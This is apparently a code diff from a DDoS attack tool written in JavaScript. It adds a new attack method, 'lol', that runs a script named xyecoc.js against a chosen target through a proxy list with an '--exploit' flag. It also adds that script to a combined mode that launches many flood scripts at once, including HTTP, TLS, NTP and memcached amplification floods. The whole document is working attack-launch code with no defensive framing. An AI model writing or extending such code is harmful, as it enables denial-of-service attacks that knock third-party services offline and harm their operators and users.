@@ -366,6 +366,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  } else if (methods === 'kupal') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 100 3 proxy.txt`)
+	  sigma()
+	  } else if (methods === 'lol') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration} 3 100 proxy.txt --exploit`)
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
@@ -382,6 +386,7 @@ const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
 const ntp = path.join(__dirname, `NTP`);
 const mem = path.join(__dirname, `MEM`);
 const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
+const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -397,6 +402,7 @@ const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
         exec(`node ${ntp} ${target} 80 ${duration}`)
         exec(`node ${mem} ${target} 80 ${duration}`)
 	exec(`node ${kupal} ${target} ${duration} 100 3 proxy.txt`)
+	exec(`node ${lol} ${target} ${duration} 3 100 proxy.txt --exploit`)
 	  
 	  
           sigma()
